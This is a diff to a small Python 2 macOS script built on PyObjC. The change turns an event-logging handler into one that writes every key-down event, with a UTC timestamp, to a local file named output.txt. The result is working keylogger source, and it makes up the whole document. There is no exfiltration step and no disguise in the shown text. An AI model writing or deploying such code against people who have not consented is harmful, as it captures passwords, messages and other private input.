@@ -1,7 +1,10 @@
 from Cocoa import *
-import time
 from Foundation import *
 from PyObjCTools import AppHelper
+import string
+import sys
+from time import gmtime, strftime
+
 
 class AppDelegate(NSObject):
     def applicationDidFinishLaunching_(self, aNotification):
@@ -9,11 +12,13 @@ class AppDelegate(NSObject):
 
 def handler(event):
     try:
-        NSLog(u"%@", event)
-    except (Exception, KeyboardInterrupt) as e:
+        if event.type() == NSKeyDown:
+            with open('output.txt', 'a+') as f:
+                f.write(strftime("%Y-%m-%d %H:%M:%S", gmtime()) + " " + str(event) + "\n")
+    except ( KeyboardInterrupt ) as e:
         print e
-        print "hi"
         AppHelper.stopEventLoop()
+        exit(1)
 
 def main():
     app = NSApplication.sharedApplication()
@@ -21,5 +26,6 @@ def main():
     NSApp().setDelegate_(delegate)
     AppHelper.runEventLoop()
 
+
 if __name__ == '__main__':
-   main()
+    main()
